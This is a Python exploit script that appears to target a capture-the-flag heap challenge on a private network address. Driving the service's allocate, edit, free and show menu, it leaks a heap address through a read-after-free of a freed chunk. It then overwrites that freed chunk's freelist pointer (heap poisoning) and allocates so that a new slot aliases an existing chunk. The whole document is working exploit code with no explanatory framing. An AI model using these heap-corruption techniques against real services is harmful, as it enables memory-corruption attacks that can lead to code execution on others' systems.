import socket, time, re

HOST = "10.13.37.10"
PORT = 21968

class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=8)
        self.s.settimeout(0.5)
        self.buf = b""
    def _fill(self, deadline):
        while time.time() < deadline:
            try:
                chunk = self.s.recv(4096)
                if chunk == b"":
                    return
                self.buf += chunk
            except socket.timeout:
                continue
    def read_until_prompt(self, timeout=4.0):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.buf.rstrip(b" ").endswith(b">") or self.buf.endswith(b": "):
                out, self.buf = self.buf, b""
                return out
            self._fill(min(time.time() + 0.3, deadline))
        out, self.buf = self.buf, b""
        return out
    def cmd(self, data, timeout=4.0):
        if isinstance(data, str):
            data = data.encode()
        try:
            self.s.sendall(data + b"\n")
        except (BrokenPipeError, OSError) as e:
            return f"<<SEND FAILED: {e}>>".encode()
        return self.read_until_prompt(timeout)
    def close(self):
        try: self.s.close()
        except Exception: pass

def hexdump(s):
    m = re.search(rb"raw:([0-9a-f]+)", s)
    return m.group(1).decode() if m else None

c = Conn()
print(c.read_until_prompt(3.0).decode(errors="replace"))

def new(slot, ln, data):
    c.cmd("1"); c.cmd(str(slot)); c.cmd(str(ln)); return c.cmd(data)
def edit(slot, ln, data):
    c.cmd("2"); c.cmd(str(slot)); c.cmd(str(ln)); return c.cmd(data)
def free(slot):
    c.cmd("3"); return c.cmd(str(slot))
def show(slot):
    c.cmd("4"); return c.cmd(str(slot))

r = new(0, 16, "A"*16); print("new0:", r.decode(errors="replace"))
r = new(1, 16, "B"*16); print("new1:", r.decode(errors="replace"))
r = free(0); print("free0:", r.decode(errors="replace"))
r = free(1); print("free1:", r.decode(errors="replace"))

# peek chunk1's real 'next' (should be chunk0's true address) BEFORE poisoning
s1 = show(1)
h1 = hexdump(s1)
real_next = int.from_bytes(bytes.fromhex(h1[0:16]), "little")
print(f"chunk1's real next (=chunk0 addr) = {hex(real_next)}")
KNOWN_GOOD = real_next  # this is a real, valid, live heap chunk address (chunk0)

r = edit(1, 16, KNOWN_GOOD.to_bytes(8,'little') + b"\x00"*8)
print("edit1 poison with KNOWN_GOOD (=chunk0):", r.decode(errors="replace"))

r = new(2, 16, "C"*16); print("new2 (pop chunk1):", r.decode(errors="replace"))

print("--- new3 (should alias chunk0 again, KNOWN VALID) ---")
r = c.cmd("1"); print("after '1':", r.decode(errors="replace"))
r = c.cmd("3"); print("after slot='3':", r.decode(errors="replace"))
r = c.cmd("16"); print("after len='16':", r.decode(errors="replace"))
r = c.cmd("E"*16); print("after name data:", r.decode(errors="replace"))

r = show(3)
print("slot3 show:", r.decode(errors="replace"))

c.close()
